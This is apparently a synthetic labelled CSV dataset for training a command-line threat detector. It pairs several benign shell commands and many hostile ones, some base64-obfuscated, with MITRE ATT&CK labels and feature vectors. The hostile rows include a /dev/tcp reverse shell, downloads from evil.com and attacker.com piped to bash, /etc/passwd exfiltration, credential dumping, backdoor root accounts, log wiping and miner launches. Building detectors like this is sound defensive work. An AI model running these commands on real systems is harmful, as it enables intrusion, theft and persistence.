command,features,label,source
sudo nc -zv 10.0.0.1 1-1000 2>&1 | grep succeeded,"[1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.36, 1, 0]",['T1046_Network_Service_Scanning'],synthetic
nohup procdump.exe -ma lsass.exe lsass.dmp | chmod +x /tmp/payload &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.4, 1, 1]","['T1003_OS_Credential_Dumping', 'T1059_Command_and_Scripting_Interpreter']",synthetic
getent passwd | awk -F: '$3 >= 1000',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 0]",['T1033_System_Owner_Discovery'],synthetic
"ldapsearch -x -b 'dc=domain,dc=com' '(objectClass=person)'","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
nohup hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1 && chmod +x /tmp/payload &,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 1, 1]","['T1110_Brute_Force', 'T1059_Command_and_Scripting_Interpreter']",synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
time echo 'dW5zZXQgSElTVEZJTEU7IGV4cG9ydCBISVNUU0laRT0w' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
journalctl -u ssh --since today,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
cat /etc/passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'cHl0aG9uMyAtYyAiaW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyki' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
time fping -a -g 192.168.1.0/24 2>/dev/null,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.24, 0, 0]",['T1018_Remote_System_Discovery'],synthetic
at now + 1 minute <<< '/tmp/payload',"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1053_Scheduled_Task'],synthetic
nohup ifconfig -a &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'aWQgLUdu' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"python3 -c ""import os; os.system('id')""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
Get-LocalGroupMember -Group Administrators,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
lscpu,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 0]",['T1082_System_Information_Discovery'],synthetic
cat /etc/group ; sleep 1,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1069_Permission_Groups_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'Y2VydHV0aWwuZXhlIC11cmxjYWNoZSAtc3BsaXQgLWYgaHR0cDovL2F0dGFja2VyLmNvbS9uYy5leGUgbmMuZXhl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'dXNlcm1vZCAtYUcgc3VkbyBjb21wcm9taXNlZF91c2Vy' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1098_Account_Manipulation', 'T1027_Obfuscated_Files_or_Information']",synthetic
ls -la /home/user,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
perl -e 'use Socket; ...',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
python3 exploit.py --target localhost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
echo 'Y3VybCAtc0wgaHR0cDovL2V2aWwuY29tL3htcmlnIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
wget -q -O- --header='X-Auth: token123' http://evil.com/cmd ; chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 1, 1]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo su -s /bin/bash www-data,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1078_Valid_Accounts'],synthetic
echo 'Y3VybCAtQSAnTW96aWxsYS81LjAnIGh0dHA6Ly9jMi5hdHRhY2tlci5jb20vY2hlY2staW4=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1071_Application_Layer_Protocol', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'cGVybCAtZSAndXNlIFNvY2tldDsgLi4uJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup scp attacker@10.0.0.99:/tools/linpeas.sh /tmp/ &,"[1, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo '' > /var/log/syslog,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1070_Indicator_Removal'],synthetic
echo 'bGRhcHNlYXJjaCAteCAtYiAnZGM9ZG9tYWluLGRjPWNvbScgJyhvYmplY3RDbGFzcz1wZXJzb24pJw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1087_Account_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
bash -i >& /dev/tcp/10.0.0.99/4444 0>&1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1059_Command_and_Scripting_Interpreter'],synthetic
sudo find / -name '*.conf' -readable 2>/dev/null | head -20,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]",['T1083_File_and_Directory_Discovery'],synthetic
nohup ./xmrig --url stratum+tcp://pool.minexmr.com:443 --user wallet &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
echo 'eGZyZWVyZHAgL3U6QWRtaW5pc3RyYXRvciAvcDpQYXNzd29yZDEyMyAvdjoxMC4wLjAuNQ==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
sudo echo 'aGVsbG8=' | base64 -d | bash,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
nohup echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZSA7IGhpc3RvcnkgLWM=' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""dmidecode -t system && > /dev/null 2>&1""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.36, 1, 0]","['T1082_System_Information_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'dW5zaGFkb3cgL2V0Yy9wYXNzd2QgL2V0Yy9zaGFkb3cgPiBjcmFja21l' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1003_OS_Credential_Dumping', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup echo 'dXNlcmFkZCAtbyAtdSAwIC1nIDAgLU0gLWQgL3Jvb3QgLXMgL2Jpbi9iYXNoIGdob3N0' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1136_Create_Account', 'T1027_Obfuscated_Files_or_Information']",synthetic
time id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.12, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo 'ZWNobyAnQHJlYm9vdCAvdG1wLy54bXIveG1yaWcgLW8gcG9vbC5taW5leG1yLmNvbScgfCBjcm9udGFiIC0=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1496_Resource_Hijacking', 'T1027_Obfuscated_Files_or_Information']",synthetic
echo 'bG4gLXMgL3RtcC9iYWNrZG9vci5zaCAvZXRjL2Nyb24uZC9zeXN0ZW0tdXBkYXRl' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1027_Obfuscated_Files_or_Information']",synthetic
ip link show,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1016_System_Network_Config_Discovery'],synthetic
echo 'ZWNobyAnYUdWc2JHOD0nIHwgYmFzZTY0IC1kIHwgYmFzaA==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]",['T1027_Obfuscated_Files_or_Information'],synthetic
"bash -c ""runuser -l postgres -c 'psql -c ""SELECT pg_read_file(\'/etc/passwd\')""'""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.4, 0, 0]",['T1078_Valid_Accounts'],synthetic
"bash -c ""nmap -sV -p 22,80,443 10.0.0.0/24 ; history -c""","[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.4, 1, 0]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'c2NwIGF0dGFja2VyQDEwLjAuMC45OTovdG9vbHMvbGlucGVhcy5zaCAvdG1wLw==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1105_Ingress_Tool_Transfer', 'T1027_Obfuscated_Files_or_Information']",synthetic
curl  -s  https://api.github.com/repos/user/repo,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nohup  ./xmrig  --url  stratum+tcp://pool.minexmr.com:443  --user  wallet  &,"[0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 0, 0]",['T1496_Resource_Hijacking'],synthetic
sudo ssh -L 8080:internal:80 user@jump.host ; history -c,"[0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.32, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup echo 'bm1hcCAtc1YgLXAgMjIsODAsNDQzIDEwLjAuMC4wLzI0' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1018_Remote_System_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
time python3 -c 'print(1+1)',"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
dmesg | head -20,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.16, 1, 0]",['T1082_System_Information_Discovery'],synthetic
id -Gn,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0.0, 0.08, 0, 0]",['T1069_Permission_Groups_Discovery'],synthetic
./pwnkit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.04, 0, 1]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
apt-get update,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
time echo 'bHMgLWxhIC9yb290IC9ldGMgL3Zhci93d3c=' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.32, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
passwd -d root,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['T1098_Account_Manipulation'],synthetic
smbclient //10.0.0.5/C$ -U Administrator,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1021_Remote_Services'],synthetic
sudo ssh -L 8080:internal:80 user@jump.host,"[0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1021_Remote_Services'],synthetic
sudo curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
ncrack -p 22 --user root -P pass.lst 10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1110_Brute_Force'],synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.52, 0, 0]",['T1136_Create_Account'],synthetic
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://10.0.0.1,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1110_Brute_Force'],synthetic
sudo find / -writable -type d 2>/dev/null && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0.0, 0.44, 1, 1]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
net user /add attacker P@ssw0rd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
pip install requests,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.12, 0, 0]",['BENIGN'],synthetic
nmap -sn 192.168.1.0/24 | chmod +x /tmp/payload,"[1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0.2, 0.28, 1, 1]","['T1018_Remote_System_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost && chmod +x /tmp/payload,"[0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.68, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
nohup nmap -sV --version-intensity 5 -p 1-65535 10.0.0.1 ; history -c &,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0.0, 0.48, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter']",synthetic
wmiexec.py domain/admin:pass@10.0.0.5 ; echo done,"[1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 1, 0]","['T1021_Remote_Services', 'T1059_Command_and_Scripting_Interpreter']",synthetic
adduser  --shell  /bin/bash  --disabled-password  backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
echo  'cHl0aG9uMyBleHBsb2l0LnB5IC0tdGFyZ2V0IGxvY2FsaG9zdCA7IGNobW9kICt4IC90bXAvcGF5bG9hZA=='  |  base64  -d  |  bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1068_Exploitation_for_Privilege_Escalation', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
nohup at now + 1 minute <<< '/tmp/payload' | echo done &,"[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.48, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
echo 'cm0gLXJmIC90bXAvKiAvdmFyL3RtcC8q' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1070_Indicator_Removal', 'T1027_Obfuscated_Files_or_Information']",synthetic
adduser --shell /bin/bash --disabled-password backdoor,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1136_Create_Account'],synthetic
nohup echo 'cmVnIGFkZCBIS0xNXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiBCYWNrZG9vciAvZCBDOlxwYXlsb2FkLmV4ZQ==' | base64 -d | bash &,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1112_Modify_Registry', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""curl -sL http://evil.com/xmrig | bash""","[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]",['T1496_Resource_Hijacking'],synthetic
sed -i 's/old/new/g' config.cfg,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['BENIGN'],synthetic
time find / -writable -type d 2>/dev/null | history -c,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0.2, 0.4, 1, 0]","['T1083_File_and_Directory_Discovery', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time su - admin,"[0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.16, 0, 0]",['T1078_Valid_Accounts'],synthetic
getent passwd | grep -v nologin,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.24, 1, 0]",['T1087_Account_Discovery'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
curl  -sL  http://evil.com/shell.sh  -o  /tmp/shell.sh,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
time reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /d C:\payload.exe,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.32, 0, 0]",['T1112_Modify_Registry'],synthetic
"bash -c ""echo 'bm1hcCAtc1YgLS12ZXJzaW9uLWludGVuc2l0eSA1IC1wIDEtNjU1MzUgMTAuMC4wLjEgfCBoaXN0b3J5IC1j' | base64 -d | bash""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.36, 1, 0]","['T1046_Network_Service_Scanning', 'T1059_Command_and_Scripting_Interpreter', 'T1027_Obfuscated_Files_or_Information']",synthetic
df -h,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.08, 0, 0]",['BENIGN'],synthetic
certutil.exe -urlcache -split -f http://attacker.com/nc.exe nc.exe,"[0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0.0, 0.24, 0, 0]",['T1105_Ingress_Tool_Transfer'],synthetic
useradd -o -u 0 -g 0 -M -d /root -s /bin/bash ghost,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.48, 0, 0]",['T1136_Create_Account'],synthetic
"bash -c ""adduser --shell /bin/bash --disabled-password backdoor ; chmod +x /tmp/payload""","[0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.0, 0.44, 1, 1]","['T1136_Create_Account', 'T1059_Command_and_Scripting_Interpreter']",synthetic
systemctl enable --now malicious.service | sleep 1,"[0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.28, 1, 0]","['T1053_Scheduled_Task', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time unshadow /etc/passwd /etc/shadow > crackme,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.24, 0, 0]",['T1003_OS_Credential_Dumping'],synthetic
echo 'c21iY2xpZW50IC8vMTAuMC4wLjUvQyQgLVUgQWRtaW5pc3RyYXRvcg==' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1021_Remote_Services', 'T1027_Obfuscated_Files_or_Information']",synthetic
time gcc exploit.c -o exploit && ./exploit,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.28, 1, 0]",['T1068_Exploitation_for_Privilege_Escalation'],synthetic
time wget --post-file=/etc/passwd http://attacker.com/receive | chmod +x /tmp/payload,"[0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0.2, 0.32, 1, 1]","['T1041_Exfiltration_Over_C2_Channel', 'T1059_Command_and_Scripting_Interpreter']",synthetic
time curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1071_Application_Layer_Protocol'],synthetic
echo 'Y2F0IC9ldGMvbmV0d29yay9pbnRlcmZhY2Vz' | base64 -d | bash,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0.4, 0.28, 1, 0]","['T1016_System_Network_Config_Discovery', 'T1027_Obfuscated_Files_or_Information']",synthetic
"bash -c ""du -sh /var/log""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['BENIGN'],synthetic
ps  aux  |  grep  nginx,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.2, 0.2, 1, 0]",['BENIGN'],synthetic
"bash -c ""net user /domain""","[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1087_Account_Discovery'],synthetic
time echo 'backdoor:x:0:0:root:/root:/bin/bash' >> /etc/passwd,"[0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0.0, 0.2, 0, 0]",['T1098_Account_Manipulation'],synthetic
nohup curl -A 'Mozilla/5.0' http://c2.attacker.com/check-in ; > /dev/null 2>&1 &,"[0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0.0, 0.4, 1, 0]","['T1071_Application_Layer_Protocol', 'T1059_Command_and_Scripting_Interpreter']",synthetic
